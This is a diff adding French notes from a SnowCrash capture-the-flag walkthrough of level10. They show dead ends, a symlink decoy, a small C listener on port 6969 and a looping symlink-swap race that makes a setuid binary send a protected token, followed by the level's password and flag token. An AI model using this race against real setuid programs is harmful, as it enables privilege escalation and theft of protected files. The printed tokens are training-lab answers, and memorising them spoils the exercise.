@@ -663,8 +663,162 @@ LEVEL10
     -rw-------  1 flag10 flag10     26 Mar  5  2016 token
 
 
+- ./level10 
+    ./level10 file host
+	    sends file to host if you have access to it
+
+ ./level10 token flag10
+    You don't have access to token
+
+-Idee : pour recupere l'acces a token, je fait un leurre dans mon /tmp 
+
+    cd /tmp
+    mkdir leurre
+    ln ln -s /home/user/level10/token /tmp/leurre
+    cd ~
+    ./level10 /tmp/leurre flag10
+        Connecting to flag10:6969 .. Unable to connect to host flag10
+
+- J'ai bien recup token mais je n'ai pas le bon user -> essaye de se connecter à un service réseau sur flag10:6969
+    Pas d'acces a 6969 -> changement de piste
+
+- strings level10 :
+                    level10.c
+                    
+- ../../../usr pour des recherches de login/host/user
+  grep -r level10 .
+    grep: ./share/doc/tasksel/changelog.gz: Too many levels of symbolic links  -> piste
+
+    cd /share/doc/tasksel  ->  cat TODO
+            Now that debconf-apt-progress is used and tasksel can run inside debconf,
+            it would be nice to convert it so tasksel starts debconf and the beginning,
+            and runs everything under debconf, except perhaps any manual package
+            selection that the user might decide to do. This would reduce startup
+            delays and also the delay between the two debconf runs it does now.
+
+            Also, to better handle the case of one task being removed while another is
+            installed, use debconf-apt-progress with waypoints.
+        Meh, ca n'as pas l'aire d'etre une bonne piste, pas grand chose a voir avec ./level10 ou des hosts
+
+- Idee : reussir a executer getflag sans dependre du reseau ? (6969) 
+    - Verifier comment lon leurre est lu avec strace (trace les appels système d’un programme, toutes les interactions qu’un programme a avec le noyau Linux : lecture/écriture de fichiers, ouverture de fichiers, création de processus, allocation de mémoire, communication réseau, etc.)
+        strace ./level10 /tmp/leurre/token 2>&1 | grep open
+            open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+            open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+
+            ->ouvre uniquement des fichiers système et pas token
+
+-Idee : sortir de la vm pour pouvoir atteindre le serveur flag10:6969 
+    netcat ?
 
 
+    On doit faire un petit server nous meme ? 
+        ./level10 /tmp/leurre 0.0.0.0
+            Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
+        ./level10 /tmp/leurre 127.0.0.1
+            Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+        ./level10 /tmp/leurre 10.0.2.15
+            Connecting to 10.0.2.15:6969 .. Unable to connect to host 10.0.2.15
+
+    -> on dois faire notre petit serveur nous meme ? 
 
 
-    
+    cd /tmp 
+    vim server.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+#define PORT 6969
+#define BUFFER_SIZE 1024
+
+int main() {
+    int server_fd, new_socket;
+    struct sockaddr_in address;
+    socklen_t addrlen = sizeof(address);
+    char buffer[BUFFER_SIZE];
+    int bytes_read;
+
+    // Création du socket
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket failed");
+        exit(EXIT_FAILURE);
+    }
+
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = INADDR_ANY;
+    address.sin_port = htons(PORT);
+
+    // Bind
+    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
+        perror("bind failed");
+        exit(EXIT_FAILURE);
+    }
+
+    // Écoute
+    if (listen(server_fd, 1) < 0) {
+        perror("listen failed");
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Server listening on port %d...\n", PORT);
+
+    while (1) {
+        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0) {
+            perror("accept failed");
+            continue;
+        }
+
+        printf("Connected by %s:%d\n", inet_ntoa(address.sin_addr), ntohs(address.sin_port));
+
+        // Lire tout le flux et l’afficher directement
+        while ((bytes_read = read(new_socket, buffer, BUFFER_SIZE)) > 0) {
+            fwrite(buffer, 1, bytes_read, stdout); // Affiche tous les octets, y compris les \0
+            fflush(stdout);
+        }
+
+        close(new_socket);
+        printf("\nConnection closed.\n");
+    }
+
+    close(server_fd);
+    return 0;
+}
+
+
+        gcc /tmp/server.c -o server
+        ./server
+            Server listening on port 6969...
+
+
+    -Dans un autre onglet :    connexion ssh et go level10
+
+                    ./level10 /tmp/leurre 127.0.0.1
+                        Connecting to 127.0.0.1:6969 .. Connected!
+                        Sending file .. Unable to read from file: Is a directory
+
+    -Mon server renvoie :    
+                            Connected by 127.0.0.1:37872
+                            .*( )*.
+                            Connection closed.
+
+
+echo > /tmp/hak && while :; do ln -fs /tmp/hak /tmp/fuk; ln -fs ~/token /tmp/fuk; done
+
+./level10 /tmp/fuk 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!
+
+Connected by 127.0.0.1:37922
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+
+Connection closed.
+
+
+su flag10
+Password: 
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
